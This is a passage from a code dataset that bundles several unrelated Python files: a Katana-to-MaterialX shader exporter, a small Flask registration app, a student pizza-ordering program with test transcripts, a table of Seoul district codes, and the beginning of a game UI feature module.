logging.getLogger('MaterialXBakeNode')\ntry:\n    import MaterialX as mx\nexcept ImportError:\n    log.error(\"Can`t find MaterialX -- %s\"% sys.exc_info()[0])\ntry:\n    from Katana import NodegraphAPI\nexcept ImportError:\n    print \"Can`t find Katana\"\n\nNODEDEFS_SEARCH_PATH=[\n    os.path.join(os.path.dirname(__file__), 'arnold', 'ai_nodedefs.mtlx'),\n    os.path.join(os.path.dirname(__file__), 'arnold', 'lca_nodedefs.mtlx'),\n    os.path.join(os.path.dirname(__file__), 'arnold', 'mtoa_nodedefs.mtlx'),\n]\n\nCOLOR3 = ['out', 'out.r', 'out.g', 'out.b']\nCOLOR4 = ['out', 'out.r', 'out.g', 'out.b', 'out.a']\nSWIZZLE_SUFFIX = ['.r', '.g', '.b', '.a', '.x', '.y', '.z']\nARNOLD_SHADER_TYPE = {\n    \"arnoldSurface\":\"surfaceshader\",\n    \"arnoldDisplacement\":\"displacementshader\",\n}\n\ndef TraverseUpstreamNodes(asnode, sets):\n    asnode_name = asnode.getName()\n    log.info(\"Traverse current ArnoldShadingNode - %s\"%asnode_name)\n    up_nodes = getConnectedUpstreamNodes(asnode)\n    for t_node in up_nodes:\n        sets.append(t_node)\n        TraverseUpstreamNodes(t_node, sets)\n\ndef getConnectedUpstreamNodes(asnode):\n    \"\"\"\n    Get upstream nodes which connected to current node.\n    \"\"\"\n    result_nodes = []\n    inputports = asnode.getInputPorts()\n    for i_port in inputports:\n        port = i_port.getConnectedPort(0)\n        if not port:\n            continue\n        shader_name = port.getNode()\n        result_nodes.append(shader_name)\n    return result_nodes\n\ndef isPortConnected(port):\n    \"\"\"\n    Check out if this port connected with any other ports.\n    \"\"\"\n    ports = port.getConnectedPorts()\n    if ports:\n        return True\n    else:\n        return False\n\ndef getConnectedNode(port):\n    \"\"\"\n    Get the node which connected to the input port.\n    \"\"\"\n    if isPortConnected(port):\n        return port.getConnectedPort(0).getNode()\n    else:\n        return None\n\ndef isKatanaParamEnable(asnode, param_name):\n    _enable = asnode.getParameter(\"parameters.%s.enable\"%param_name).getValue(0)\n    if _enable:\n        return True\n    else:\n        return False\n\ndef getMaterialXParamsValue(asnode, param_name):\n    \"\"\"\n    Get MaterialX Standard Value from ArnoldShadingNode.\n    \"\"\"\n    def _getType(asnode, param_name):\n        shader_name = asnode.getParameter('nodeType').getValue(0)\n        # Traverse the document tree in depth-first order.\n        for nodedef_file in NODEDEFS_SEARCH_PATH:\n            doc = mx.createDocument()\n            mx.readFromXmlFile(doc, nodedef_file)\n            mx_nodedefs = doc.getNodeDef(shader_name)\n            if mx_nodedefs:\n                input_param = mx_nodedefs.getInput(param_name)\n                # Some params might not record in the NodeDefs.\n                if input_param:\n                    return input_param.getType()\n            else:\n                continue\n    param_type = asnode.getParameter(\"parameters.%s.value\"%param_name).getType()\n    mx_input_type = _getType(asnode, param_name)\n\n    # If parameter is katana type string\n    if param_type == \"string\":\n        return \"string\", asnode.getParameter(\"parameters.%s.value\"%param_name).getValue(0)\n    # If parameter is katana type number\n    elif param_type == \"number\":\n        if mx_input_type == \"integer\":\n            return \"integer\", int(asnode.getParameter(\"parameters.%s.value\"%param_name).getValue(0))\n        elif mx_input_type == \"boolean\":\n            if int(asnode.getParameter(\"parameters.%s.value\"%param_name).getValue(0)):\n                return \"boolean\", \"true\"\n            else:\n                return \"boolean\", \"false\"\n        elif mx_input_type == \"float\":\n            return \"float\", asnode.getParameter(\"parameters.%s.value\"%param_name).getValue(0)\n        else:\n            log.error(\"Not support unknown yet! -- %s : %s\"%(asnode.getName(), param_name) )\n            return \"\", \"\"\n    # If parameter is katana type numberArray\n    elif param_type == \"numberArray\":\n        # Find out the tuple type,color or vector or some else?\n        param_value = asnode.getParameter(\"parameters.%s.value\"%param_name)\n        _tuple = []\n        for child in param_value.getChildren():\n            _tuple.append(child.getValue(0))\n\n        if mx_input_type == \"color2\":\n            return \"color2\", mx.Color2(_tuple[0], _tuple[1])\n        elif mx_input_type == \"color3\":\n            return \"color3\", mx.Color3(_tuple[0], _tuple[1], _tuple[2])\n        elif mx_input_type == \"color4\":\n            return \"color4\", mx.Color4(_tuple[0], _tuple[1], _tuple[2], _tuple[3])\n        elif mx_input_type == \"vector2\":\n            return \"vector2\", mx.Vector2(_tuple[0], _tuple[1])\n        elif mx_input_type == \"vector3\":\n            print \"##\", asnode.getName(), param_name\n            return \"vector3\", mx.Vector3(_tuple[0], _tuple[1], _tuple[2])\n        elif mx_input_type == \"vector4\":\n            return \"vector4\", mx.Vector4(_tuple[0], _tuple[1], _tuple[2], _tuple[3])\n        elif mx_input_type == \"floatarray\":\n            log.error(\"Not support floatarray yet! -- %s : %s\"%(asnode.getName(), param_name) )\n            return \"floatarray\", \"\"\n        elif mx_input_type == \"color3array\":\n            log.error(\"Not support color3array yet! -- %s : %s\"%(asnode.getName(), param_name) )\n            return \"color3array\", \"\"\n        elif mx_input_type == \"integerarray\":\n            log.error(\"Not support integerarray yet! -- %s : %s\"%(asnode.getName(), param_name) )\n            return \"integerarray\", \"\"\n        else:\n            log.error(\"Not support unknown yet! -- %s : %s\"%(asnode.getName(), param_name) )\n            return \"\", \"\"\n\ndef removeSwizzleSuffix(param_name):\n    \"\"\"\n    Remove param subffix so that we could get it`s type for once.\n    \"\"\"\n    suffix_list = SWIZZLE_SUFFIX\n    for suffix in suffix_list:\n        if param_name.endswith(suffix ):\n            param_name = param_name[:-2]\n    return param_name\n\n\ndef SetMaterialXShaderRefParams(mxnode, asnode):\n    \"\"\"\n    Set Arnold Params to MaterialX ShaderRef Parameter.\n    \"\"\"\n    _param_name_list = []\n    for input_port in asnode.getInputPorts():\n        param_name = removeSwizzleSuffix(input_port.getName())\n        # To ignore some input ports like base_color,base_color.r etc.\n        # Make sure every parameter loops just once.\n        if param_name not in _param_name_list:\n            _param_name_list.append(param_name)\n        else:\n            continue\n        if isPortConnected(input_port):\n            bind_input = mxnode.addBindInput(param_name)\n            upstream_node = getConnectedNode(input_port)\n            bind_input.setNodeGraphString(\"NodeGraph__\"+upstream_node.getName())\n            bind_input.setOutputString(\"out\")\n        else:\n            # If katana param is not enabled, skip!\n            if not isKatanaParamEnable(asnode, param_name):\n                continue\n            _type, _value = getMaterialXParamsValue(asnode, param_name)\n            # If type is unknown, skip!\n            if _type:\n                bind_input = mxnode.addBindInput(param_name, _type)\n                # If _value == \"\", Skip!\n                if _value:\n                    bind_input.setValue(_value)\n\ndef SetMaterialXNodeRefParams(mxnode, asnode):\n    \"\"\"\n    Set Arnold Params to MaterialX NodeRef Parameter.\n    \"\"\"\n    _param_name_list = []\n    for input_port in asnode.getInputPorts():\n        param_name = removeSwizzleSuffix(input_port.getName())\n        # To ignore some input ports like base_color,base_color.r etc.\n        # Make sure every parameter loops just once.\n        if param_name not in _param_name_list:\n            _param_name_list.append(param_name)\n        else:\n            continue\n        if isPortConnected(input_port):\n            upstream_node = getConnectedNode(asnode.getInputPort(param_name))\n            mxnode.setConnectedNodeName(param_name, upstream_node.getName())\n        else:\n            # If katana param is not enabled, skip!\n            if not isKatanaParamEnable(asnode, param_name):\n                continue\n\n            _type, _value = getMaterialXParamsValue(asnode, param_name)\n            if _type and _value:\n                mxnode.setInputValue(param_name, _value, _type)\n\n\ndef buildMXMaterial(document, ktnnode):\n    \"\"\"\n    Create MaterialX Material and and inside contents.\n    \"\"\"\n    material_name = ktnnode.getName()\n    mx_material = document.getMaterial(\"Material__\"+material_name)\n    if not mx_material:\n        mx_material = document.addMaterial(\"Material__\"+material_name)\n    return mx_material\n\ndef buildMXShaderRef(document, asnode):\n    \"\"\"\n    Create MaterialX ShaderRef and inside contents.\n    \"\"\"\n    material_name = asnode.getOutputPortByIndex(0).getConnectedPort(0).getNode().getName()\n    material = document.getMaterial(\"Material__\" + material_name)\n    nm_node_port_name = asnode.getOutputPortByIndex(0).getConnectedPort(0).getName()\n    shader_ref_type = ARNOLD_SHADER_TYPE[nm_node_port_name]\n    shader_ref_name = asnode.getName()\n    input_type = asnode.getParameter('nodeType').getValue(0)\n    mx_shader_ref = material.getShaderRef(\"ShaderRef__\"+shader_ref_name)\n    if not mx_shader_ref:\n        mx_shader_ref = material.addShaderRef(\"ShaderRef__\"+shader_ref_name, input_type)\n        #~ Set shaderref parameter\n        SetMaterialXShaderRefParams(mx_shader_ref, asnode)\n    mx_shader_ref.setType(shader_ref_type)\n    return mx_shader_ref\n\n\ndef buildMXNodeGraph(document, asnode):\n    \"\"\"\n    Create MaterialX NodeGraph and inside contents.\n    \"\"\"\n    node_graph_name = asnode.getName()\n    mx_node_graph = document.getNodeGraph(\"NodeGraph__\"+node_graph_name)\n    if not mx_node_graph:\n        mx_node_graph = document.addNodeGraph(\"NodeGraph__\"+node_graph_name)\n\n        root_asnode_name = asnode.getName()\n        root_asnode_type = asnode.getParameter('nodeType').getValue(0)\n        root_asnode = mx_node_graph.addNode( root_asnode_type, name=root_asnode_name)\n        SetMaterialXNodeRefParams(root_asnode, asnode)\n        \n        upstream_nodes = []\n        TraverseUpstreamNodes(asnode, upstream_nodes)\n        for next_node in upstream_nodes:\n            next_asnode_name = next_node.getName()\n            next_asnode_type = next_node.getParameter('nodeType').getValue(0)\n            next_asnode = mx_node_graph.getNode( next_asnode_name )\n            if not next_asnode:\n                next_asnode = mx_node_graph.addNode( next_asnode_type, name=next_asnode_name)\n                SetMaterialXNodeRefParams(next_asnode, next_node)\n        output = mx_node_graph.addOutput('out')\n        output.setConnectedNode(root_asnode)\n    return mx_node_graph\n\ndef export(sets, saveTo):\n    # Create a document.\n    doc = mx.createDocument()\n    # Include Arnold nodedefs.\n    for nodedef_file in NODEDEFS_SEARCH_PATH:\n        mx.prependXInclude(doc, nodedef_file)\n    for look_name in sets:\n        node_sets = sets[look_name]\n\n        for node_set in node_sets:\n            collection_node_name = node_set[0]\n            network_material_node_name = node_set[1]\n            # If polymesh not be assigned a NetworkMaterial, skip!\n            if not network_material_node_name:\n                continue\n            # {nm_node} : NetworkMaterialNode\n            nm_node = NodegraphAPI.GetNode(network_material_node_name)\n            # The material node might be surafceShader or displacementShader\n            # so we need to record it all.\n            material_node_list = getConnectedUpstreamNodes(nm_node)\n            # {as_node} : ArnoldShadingNode\n            for as_node in material_node_list:\n                mx_material = buildMXMaterial(doc, nm_node)\n                mx_shader_ref = buildMXShaderRef(doc, as_node)\n                input_port_list = as_node.getInputPorts()\n                node_graph_node_list = []\n                # Get nodeGraph root node list\n                for input_port in input_port_list:\n                    if isPortConnected(input_port):\n                        node_graph_node = getConnectedNode(input_port)\n                        if not node_graph_node in node_graph_node_list:\n                            node_graph_node_list.append(node_graph_node)\n                # Create nodeGraph node\n                for node_graph_node in node_graph_node_list:\n                    mx_node_graph = buildMXNodeGraph(doc,node_graph_node)\n\n        # Create a look.\n        look = doc.addLook(look_name)\n        for node_set in node_sets:\n            collection_node_name = node_set[0]\n            network_material_node_name = node_set[1]\n\n            # Create a collection.\n            collection = doc.addCollection(\"Colloction__\"+look_name+\"_\"+collection_node_name.replace(\"/\",\"_\"))\n            # collection.addCollectionAdd(\"CollectionAdd__\"+look_name+\"_\"+collection_node_name.replace(\"/\",\"_\"))\n            collection.setIncludeGeom (\"*\"+collection_node_name)\n\n            materialAssign = look.addMaterialAssign(\"MaterialAssign__\"+look_name+\"_\"+collection_node_name.replace(\"/\",\"_\"))\n            materialAssign.setCollection(collection)\n            materialAssign.setMaterial(\"Material__\"+network_material_node_name)\n\n    mx.writeToXmlFile(doc, saveTo)"}
{"blob_id": "c7c5a39cf09b1348f8f0ab97e8a58b6fbbad29c2", "directory_id": "0c118c2a9fd3449717bdceaa7d06c0d9c482a3f4", "path": "/app.py", "content_id": "c5053ef447026fed8ceff011f73431088d1d08f9", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "ujohdaniel/tradesafe", "snapshot_id": "44aa03f97eca9e3b564063bb317446947ebb637a", "revision_id": "540322aa7f32228899b398242b8128f768ef34b7", "branch_name": "refs/heads/main", "visit_date": "2023-05-12 10:22:50.573359", "revision_date": "2021-06-06 19:18:07", "committer_date": "2021-06-06 19:18:07", "github_id": "374443021", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "3552", "extension": "py", "content": "# Importing the Libraries\r\nfrom flask import Flask, render_template, request, redirect,session\r\nfrom datetime import datetime\r\nimport dateparser\r\nfrom flask_sqlalchemy import SQLAlchemy\r\nfrom flask_wtf import FlaskForm\r\nfrom wtforms import TextField, SubmitField\r\n\r\napp= Flask(__name__)\r\napp.config['SECRET_KEY']= 'tradesafeissafe'\r\napp.config['SQLALCHEMY_DATABASE_URI']= 'sqlite:///tradesafe.db'\r\ndb= SQLAlchemy(app)\r\n\r\n# Creating the tables of the database\r\nclass Registration_form(db.Model):\r\n    id= db.Column(db.Integer, primary_key=True, nullable=False)\r\n    name= db.Column(db.Text, nullable=False)\r\n    account_details= db.Column(db.Text, nullable=False)\r\n    email= db.Column(db.Text, nullable=False)\r\n    amount_paid= db.Column(db.Integer, nullable=False)\r\n    phone_no= db.Column(db.Text, nullable=False)\r\n    # first_month= db.Column(db.DateTime)\r\n    date= db.Column(db.DateTime, nullable=False, default=datetime.utcnow)\r\n\r\n# Creating WTForms \r\nclass Reg_form(FlaskForm):\r\n    name= TextField(\r\n        'Full Name', \r\n    )\r\n    account_details= TextField(\r\n        'Address',\r\n    )\r\n    email= TextField(\r\n        'Email', \r\n    )\r\n    amount_paid= TextField(\r\n        'Amount paid',\r\n    )\r\n    phone_no= TextField(\r\n        'Phone Number', \r\n    )\r\n    submit= SubmitField(\r\n        'Submit'\r\n    )\r\n\r\n@app.route('/', methods=['GET', 'POST'])\r\ndef form():\r\n    reg_data= Reg_form()\r\n\r\n    if request.method == 'POST' and  reg_data.validate_on_submit():\r\n\r\n        # adding new data from Reg_form to the database\r\n        new_name= reg_data.data['name']\r\n        new_account_details= reg_data.data['account_details']\r\n        new_email= reg_data.data['email']\r\n        new_amount_paid= reg_data.data['amount_paid']\r\n        new_phone_no= reg_data.data['phone_no']\r\n\r\n        data= Registration_form(\r\n            name= new_name,\r\n            account_details= new_account_details,\r\n            email= new_email,\r\n            amount_paid= new_amount_paid,\r\n            phone_no= new_phone_no\r\n        )\r\n\r\n        try:\r\n            db.session.add(data)\r\n            db.session.commit()\r\n            return redirect('/accounts')\r\n        except:\r\n            return 'An error occured'\r\n\r\n    return render_template('form.html', reg_data=reg_data)\r\n\r\n@app.route('/accounts')\r\ndef accounts():\r\n    reg_data= Reg_form()\r\n    reg_values= Registration_form.query.all()\r\n    \r\n    return render_template('accounts.html', reg_values= reg_values, reg_data=reg_data)\r\n\r\n@app.route('/accounts/delete/<int:id>')\r\ndef delete(id):\r\n    del_data = Registration_form.query.get_or_404(id)\r\n\r\n    try:\r\n        db.session.delete(del_data)\r\n        db.session.commit()\r\n        return redirect('/accounts')\r\n    except:\r\n        return 'An error occured'\r\n\r\n@app.route('/accounts/edit/<int:id>', methods= ['GET', 'POST'])\r\ndef edit(id):\r\n    reg_data= Reg_form()\r\n    edit_data = Registration_form.query.get_or_404(id)\r\n\r\n    if request.method == 'POST':\r\n        edit_data.name = reg_data.data['name']\r\n        edit_data.account_details = reg_data.data['account_details']\r\n        edit_data.email = reg_data.data['email']\r\n        edit_data.amount_paid = reg_data.data['amount_paid']\r\n        edit_data.phone_no = reg_data.data['phone_no']\r\n\r\n        try:\r\n            db.session.commit()\r\n            return redirect('/accounts')\r\n        except:\r\n            return 'An error occured'\r\n    else:\r\n        return render_template('edit.html', edit_data= edit_data, reg_data= reg_data)\r\n\r\n# Debug mode on\r\nif __name__ == '__main__':\r\n    app.run(debug=True)"}
{"blob_id": "c536c871093680f2b7228686a2545d536e2c5784", "directory_id": "efb9e99bfda60af676a399338f6b91ab2c68820d", "path": "/Projects/Project_3/project_3_luis_cortes.py", "content_id": "846ef69929bd9e768c47b3b8c392ddc55e450db2", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "lacortes/CS-299", "snapshot_id": "8eb218f3b4906a2e57dfa77e8a142f71b7abca73", "revision_id": "21032c2128faad3c04afd1a34fdd6d4519e134ec", "branch_name": "refs/heads/master", "visit_date": "2021-01-01 19:21:32.755144", "revision_date": "2017-08-27 02:59:01", "committer_date": "2017-08-27 02:59:01", "github_id": "98568303", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "8208", "extension": "py", "content": "# /usr/local/bin/python3\n# Luis Cortes\n# CS 299\n# Project 3\n\nPIZZA_SIZES = {\"10\": 10.99, \"12\": 12.99, \"14\": 14.99, \"16\": 16.99}\nCRUST_CHOICES = {\"1\": 0.00, \"2\": 1.00, \"3\": 2.00}\nCOUPONS = {\"Holiday10\": 0.1, \"Winter20\": 0.2, \"VIPmax\": 0.25}\nORDER = []\n\n\ndef get_size():\n    tries = 3\n\n    # Give user 3 tries to enter correct choice\n    print(\"##########################\")\n    print(\"#         Sizes          #\")\n    print(\"#************************#\")\n    print(\"#       10 inches        #\")\n    print(\"#       12 inches        #\")\n    print(\"#       14 inches        #\")\n    print(\"#       16 inches        #\")\n    print(\"##########################\")\n    print()\n    while tries > 0:\n\n        user_size = input(\"Enter pizza size: \")\n\n        if user_size in PIZZA_SIZES:  # Check if input is valid\n            ORDER.append(user_size)  # Update order details\n            return PIZZA_SIZES[user_size]\n        tries -= 1\n    else:\n        print(\"Very Sorry\")\n        return -1\n\n\ndef get_crust():\n    print(\"##########################\")\n    print(\"#        Crusts          #\")\n    print(\"#************************#\")\n    print(\"#   (1) Hand-tossed     #\")\n    print(\"#   (2) Thin-crust      #\")\n    print(\"#   (3) Deep-dish       #\")\n    print(\"##########################\")\n\n    crust = input(\"Choose crust: \").replace(\" \", \"\")\n\n    # Return corresponding fee\n    if len(crust) > 0 and crust in CRUST_CHOICES:\n        print(crust)\n        # Update order details\n        if crust == \"1\":\n            ORDER.append(\"HAND\")\n        elif crust == \"2\":\n            ORDER.append(\"THIN\")\n        elif crust == \"3\":\n            ORDER.append(\"DEEP\")\n\n        return CRUST_CHOICES[crust]\n\n    # Wrong choice entered\n    ORDER.append(\"HAND\")\n    return CRUST_CHOICES[\"1\"]\n\n\ndef apply_discount():\n    code = input(\"COUPON CODE: \").replace(\" \", \"\")\n\n    if code in COUPONS:\n        return COUPONS[code]  # Return corresponding code\n    return 0.00  # No discount\n\n\ndef cost(size, extra, discount):\n    total = size + extra\n    dis = total * discount\n    ORDER.append(dis)\n    return total - dis\n\n\ndef main():\n    print(\"+========================+\")\n    print(\"+       CPP Pizza        +\")\n    print(\"+========================+\")\n\n    size = get_size()\n\n    if size == -1:  # Check if valid size\n        print(\"Goodbye!\")\n        exit()\n\n    crust = get_crust()\n    discount = apply_discount()\n    total = cost(size, crust, discount)\n\n    print(\"**********************\")\n    print(\"*      RECEIPT       *\")\n    print(\"*--------------------*\")\n    print(\" Size: {0}\\\"     ${1}\".format(ORDER[0], size))\n    print(\" Crust: {0}   ${1:3.2f}\".format(ORDER[1], crust))\n    print(\" Discount:     ${0:3.2f}\".format(ORDER[2]))\n    print(\"*---------------------*\")\n    print(\" Total: ${0:3.2f}\".format(total))\n\n    print()\n    print(\"***Thank You For Ordering At CPP Pizza***\")\nif __name__ == \"__main__\":\n    main()\n\n# Test 1\n# ----------------------------------------------------------------------------------------------------------------------\n# +========================+\n# +       CPP Pizza        +\n# +========================+\n# ##########################\n# #         Sizes          #\n# #************************#\n# #       10 inches        #\n# #       12 inches        #\n# #       14 inches        #\n# #       16 inches        #\n# ##########################\n#\n# Enter pizza size: 15\n# Enter pizza size: 11\n# Enter pizza size: 17\n# Very Sorry\n# Goodbye!\n\n# Test 2\n# ----------------------------------------------------------------------------------------------------------------------\n# +========================+\n# +       CPP Pizza        +\n# +========================+\n# ##########################\n# #         Sizes          #\n# #************************#\n# #       10 inches        #\n# #       12 inches        #\n# #       14 inches        #\n# #       16 inches        #\n# ##########################\n#\n# Enter pizza size: 17\n# Enter pizza size: 16\n# ##########################\n# #        Crusts          #\n# #************************#\n# #   (1) Hand-tossed     #\n# #   (2) Thin-crust      #\n# #   (3) Deep-dish       #\n# ##########################\n# Choose crust: h\n# COUPON CODE: Winter20\n# **********************\n# *      RECEIPT       *\n# *--------------------*\n#  Size: 16\"     $16.99\n#  Crust: HAND   $0.00\n#  Discount:     $3.40\n# *---------------------*\n#  Total: $13.59\n#\n# ***Thank You For Ordering At CPP Pizza***\n\n# Test 3\n# ----------------------------------------------------------------------------------------------------------------------\n# +========================+\n# +       CPP Pizza        +\n# +========================+\n# ##########################\n# #         Sizes          #\n# #************************#\n# #       10 inches        #\n# #       12 inches        #\n# #       14 inches        #\n# #       16 inches        #\n# ##########################\n#\n# Enter pizza size: 12\n# ##########################\n# #        Crusts          #\n# #************************#\n# #   (1) Hand-tossed     #\n# #   (2) Thin-crust      #\n# #   (3) Deep-dish       #\n# ##########################\n# Choose crust: 3\n# 3\n# COUPON CODE:\n# **********************\n# *      RECEIPT       *\n# *--------------------*\n#  Size: 12\"     $12.99\n#  Crust: DEEP   $2.00\n#  Discount:     $0.00\n# *---------------------*\n#  Total: $14.99\n#\n# ***Thank You For Ordering At CPP Pizza***\n\n\n# Test 4\n# ----------------------------------------------------------------------------------------------------------------------\n# +========================+\n# +       CPP Pizza        +\n# +========================+\n# ##########################\n# #         Sizes          #\n# #************************#\n# #       10 inches        #\n# #       12 inches        #\n# #       14 inches        #\n# #       16 inches        #\n# ##########################\n#\n# Enter pizza size: 14\n# ##########################\n# #        Crusts          #\n# #************************#\n# #   (1) Hand-tossed     #\n# #   (2) Thin-crust      #\n# #   (3) Deep-dish       #\n# ##########################\n# Choose crust: 2\n# 2\n# COUPON CODE: VIPmax\n# **********************\n# *      RECEIPT       *\n# *--------------------*\n#  Size: 14\"     $14.99\n#  Crust: THIN   $1.00\n#  Discount:     $4.00\n# *---------------------*\n#  Total: $11.99\n#\n# ***Thank You For Ordering At CPP Pizza***\n\n# Test 5\n# ----------------------------------------------------------------------------------------------------------------------\n# +========================+\n# +       CPP Pizza        +\n# +========================+\n# ##########################\n# #         Sizes          #\n# #************************#\n# #       10 inches        #\n# #       12 inches        #\n# #       14 inches        #\n# #       16 inches        #\n# ##########################\n#\n# Enter pizza size: 10\n# ##########################\n# #        Crusts          #\n# #************************#\n# #   (1) Hand-tossed     #\n# #   (2) Thin-crust      #\n# #   (3) Deep-dish       #\n# ##########################\n# Choose crust: 1\n# 1\n# COUPON CODE: Holiday10\n# **********************\n# *      RECEIPT       *\n# *--------------------*\n#  Size: 10\"     $10.99\n#  Crust: HAND   $0.00\n#  Discount:     $1.10\n# *---------------------*\n#  Total: $9.89\n#\n# ***Thank You For Ordering At CPP Pizza***\n\n\n# Test 6\n# ----------------------------------------------------------------------------------------------------------------------\n# +========================+\n# +       CPP Pizza        +\n# +========================+\n# ##########################\n# #         Sizes          #\n# #************************#\n# #       10 inches        #\n# #       12 inches        #\n# #       14 inches        #\n# #       16 inches        #\n# ##########################\n#\n# Enter pizza size: 12\n# ##########################\n# #        Crusts          #\n# #************************#\n# #   (1) Hand-tossed     #\n# #   (2) Thin-crust      #\n# #   (3) Deep-dish       #\n# ##########################\n# Choose crust: 3\n# 3\n# COUPON CODE:\n# **********************\n# *      RECEIPT       *\n# *--------------------*\n#  Size: 12\"     $12.99\n#  Crust: DEEP   $2.00\n#  Discount:     $0.00\n# *---------------------*\n#  Total: $14.99\n#\n# ***Thank You For Ordering At CPP Pizza***"}
{"blob_id": "94be6eb7e51721d8c5d99811b4de48d54093787a", "directory_id": "a64b27d211bdb95bacff9f8ae8ee0f76618db42c", "path": "/sigun_proj/seoul_gu_list.py", "content_id": "a89bd04ae86431eedc0ece26e1e8003586339fae", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "dennisbaek/pandas_proj_micro_dust_factors", "snapshot_id": "a7eed964b2e59265f85f1abda45e32cd6e1369b9", "revision_id": "f492d430109872695113beaafd4f18f79c1286ad", "branch_name": "refs/heads/master", "visit_date": "2021-01-10 11:55:40.319667", "revision_date": "2016-01-31 06:46:11", "committer_date": "2016-01-31 06:46:11", "github_id": "50762223", "star_events_count": "2", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1277", "extension": "py", "content": "seoul_gu_list =['\uac15\ub0a8\uad6c', '\uac15\ub3d9\uad6c', '\uac15\ubd81\uad6c', '\uac15\uc11c\uad6c', '\uad00\uc545\uad6c', '\uad11\uc9c4\uad6c',\n'\uad6c\ub85c\uad6c', '\uae08\ucc9c\uad6c', '\ub178\uc6d0\uad6c', '\ub3c4\ubd09\uad6c', '\ub3d9\ub300\ubb38\uad6c', '\ub3d9\uc791\uad6c', '\ub9c8\ud3ec\uad6c', '\uc11c\ub300\ubb38\uad6c',\n'\uc11c\ucd08\uad6c', '\uc131\ub3d9\uad6c', '\uc131\ubd81\uad6c', '\uc1a1\ud30c\uad6c', '\uc591\ucc9c\uad6c', '\uc601\ub4f1\ud3ec\uad6c', '\uc6a9\uc0b0\uad6c', '\uc740\ud3c9\uad6c',\n'\uc885\ub85c\uad6c', '\uc911\uad6c', '\uc911\ub791\uad6c']\n\nseoul_dict = {'\uac15\ub0a8':'gn',\n '\uac15\ub3d9':'gd',\n '\uac15\ubd81':'gb',\n '\uac15\uc11c':'gs',\n '\uad00\uc545':'ga',\n '\uad11\uc9c4':'gj',\n '\uad6c\ub85c':'gr',\n '\uae08\ucc9c':'gc',\n '\ub178\uc6d0':'nw',\n '\ub3c4\ubd09':'db',\n '\ub3d9\ub300\ubb38':'ddm',\n '\ub3d9\uc791':'dj',\n '\ub9c8\ud3ec':'mp',\n '\uc11c\ub300\ubb38':'sdm',\n '\uc11c\ucd08':'sc',\n '\uc131\ub3d9':'sd',\n '\uc131\ubd81':'sb',\n '\uc1a1\ud30c':'sp',\n '\uc591\ucc9c':'yc',\n '\uc601\ub4f1\ud3ec':'ydp',\n '\uc6a9\uc0b0':'ys',\n '\uc740\ud3c9':'yp',\n '\uc885\ub85c':'jr',\n '\uc911\uad6c':'jg',\n '\uc911\ub791':'jr'}\n\nseoul_df_dict = {'\uac15\ub0a8':'df_gn',\n '\uac15\ub3d9':'df_gd',\n '\uac15\ubd81':'df_gb',\n '\uac15\uc11c':'df_gs',\n '\uad00\uc545':'df_ga',\n '\uad11\uc9c4':'df_gj',\n '\uad6c\ub85c':'df_gr',\n '\uae08\ucc9c':'df_gc',\n '\ub178\uc6d0':'df_nw',\n '\ub3c4\ubd09':'df_db',\n '\ub3d9\ub300\ubb38':'df_ddm',\n '\ub3d9\uc791':'df_dj',\n '\ub9c8\ud3ec':'df_mp',\n '\uc11c\ub300\ubb38':'df_sdm',\n '\uc11c\ucd08':'df_sc',\n '\uc131\ub3d9':'df_sd',\n '\uc131\ubd81':'df_sb',\n '\uc1a1\ud30c':'df_sp',\n '\uc591\ucc9c':'df_yc',\n '\uc601\ub4f1\ud3ec':'df_ydp',\n '\uc6a9\uc0b0':'df_ys',\n '\uc740\ud3c9':'df_yp',\n '\uc885\ub85c':'df_jr',\n '\uc911\uad6c':'df_jg',\n '\uc911\ub791':'df_jl'}\n"}
{"blob_id": "579f8a44f4476a920c1aa940a4d70eb652f9f7f1", "directory_id": "4c2ae427e16a93446ae1aca1ccd41d24b541fb1d", "path": "/lib/knFeatures.py", "content_id": "9cce966bc516fa7c1f51f56da32cbe96e9178797", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "facepalm/CampCannibal", "snapshot_id": "7eedbfdd4c69ae4482d8cf82c6dad1c67d70b546", "revision_id": "78b384d22adef16eeeb00ed73dd5561bc17e8131", "branch_name": "refs/heads/master", "visit_date": "2016-09-10 20:02:05.519698", "revision_date": "2009-11-17 21:09:26", "committer_date": "2009-11-17 21:09:26", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "8754", "extension": "py", "content": "#\n#  knFeatures.py\n\n\"\"\"\n\tProgrammer:\tKeith G. Nemitz\n\tE-mail:\t\tkeithn@mousechief.com\n\n\tVersion 0.0.1 Development\n\n\"\"\"\n\n\nimport knRect\nimport knImages\nimport knFonts\nimport knEvents\n\n\n\nallFeatures = [];\ncurrentHilite = None;\n\n\ndef fNOP(feature):\n    return;\n\n\n\nclass FtreRect(knRect.Rect):\n\n    def __init__(self, left,top,right,bottom):\n        knRect.Rect.__init__(self, left=left,top=top,right=right,bottom=bottom);\n        \n        allFeatures.append(self);\n        \n        self.enabled = True;\n        self.visible = True;\n        \n        self.clickAction = fNOP;\n        self.altHilite = None;\n        self.animator = None;\n        pass\n    \n    def Load(self): pass\n    def Unload(self): pass\n    \n    def Draw(self): pass\n    \n    def DrawHilite(self):\n        self.Draw();\n        pass\n    \n    def SetOpacity(self, opac):\n        pass\n        \n    def GetVisible(self):\n        return self.visible;\n        \n    def GetEnabled(self):\n        return self.enabled;\n    \n    def SetVisible(self, bool):\n        self.visible = bool;\n        pass\n        \n    def SetEnabled(self, bool):\n        if (bool != self.enabled): self.ReqDraw();\n        self.enabled = bool;\n        pass\n    \n    def MoveTo(self,bottom,left):\n        self._left = left;\n        self._bottom = bottom;\n        self.top = bottom+self._height;\n        self.right = 